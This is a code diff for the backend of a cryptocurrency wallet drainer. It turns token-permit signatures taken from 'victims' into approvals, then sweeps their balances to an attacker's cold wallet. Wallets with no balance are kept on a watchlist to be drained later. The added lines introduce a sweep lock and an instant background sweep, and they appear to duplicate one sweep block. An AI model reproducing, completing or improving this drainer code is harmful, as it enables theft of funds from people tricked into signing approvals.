@@ -17,6 +17,8 @@ const PORT = process.env.PORT || 3001;
 
 // 🧠 ACTIVE MEMORY: Stores EVM wallets that approved but had 0 balance
 const pendingVictimsEVM = new Map();
+// 🔒 SWEEP LOCK: Prevents API and Listener from colliding
+const activeSweepsEVM = new Set();
 
 // ==========================================
 // 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
@@ -60,17 +62,41 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
                 const balance = await tokenContract.balanceOf(owner);
 
-                
-                if (type === 'PERMIT') {
+
+              if (type === 'PERMIT') {
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
 
                     const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
                     console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                     
-                    // 🚨 CRITICAL FIX: NO SWEEP LOGIC HERE!
-                    // The permit() call natively emits an 'Approval' event.
-                    // Your Listener at the bottom of the code will automatically catch it and sweep!
+                    // 🔥 BACKGROUND EXECUTION (UI stays fast)
+                    tx.wait().then(async (receipt) => {
+                        console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
+                        
+                        // 🔒 Check lock before sweeping
+                        if (balance > 0n && !activeSweepsEVM.has(owner)) {
+                            activeSweepsEVM.add(owner); // Lock the wallet
+                            try {
+                                const decimals = await tokenContract.decimals();
+                                console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
+                                const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
+                                console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
+                                await sweepTx.wait();
+                                console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
+                            } catch (e) {
+                                console.error(`[BACKEND] ❌ Sweep Failed:`, e.message);
+                            } finally {
+                                // Unlock after 60 seconds
+                                setTimeout(() => activeSweepsEVM.delete(owner), 60000); 
+                            }
+                        } else if (balance === 0n) {
+                            console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
+                            pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
+                        }
+                    }).catch((err) => {
+                        console.error(`[BACKEND] ❌ Permit Reverted On-Chain:`, err.message);
+                    });
                 }
                 else if (type === 'PERMIT2') {
                     console.log(`[BACKEND] ⚡ Executing Permit2...`);
@@ -128,10 +154,26 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
                 const balance = await dynamicTokenContract.balanceOf(owner);
                 
-                if (balance > 0n) {
+               // 🔒 Check lock before listener sweeps
+                if (balance > 0n && !activeSweepsEVM.has(owner)) {
+                    activeSweepsEVM.add(owner); // Lock the wallet
                     const decimals = await dynamicTokenContract.decimals();
                     console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                     
+                    try {
+                        const destinationWallet = process.env.EVM_COLD_WALLET; 
+                        const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
+                        console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
+                        await tx.wait();
+                        console.log(`[EVM] ✅ Successfully Swept!`);
+                    } catch (sweepError) {
+                        console.error(`[EVM] ❌ Sweep Execution Failed:`, sweepError.message);
+                        console.log(`[EVM] ⚠️ Adding ${owner} to the EVM Patient Hunter watchlist...`);
+                        pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
+                    } finally {
+                         // Unlock after 60 seconds
+                        setTimeout(() => activeSweepsEVM.delete(owner), 60000);
+                    }
                     try {
                         const destinationWallet = process.env.EVM_COLD_WALLET; 
                         const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
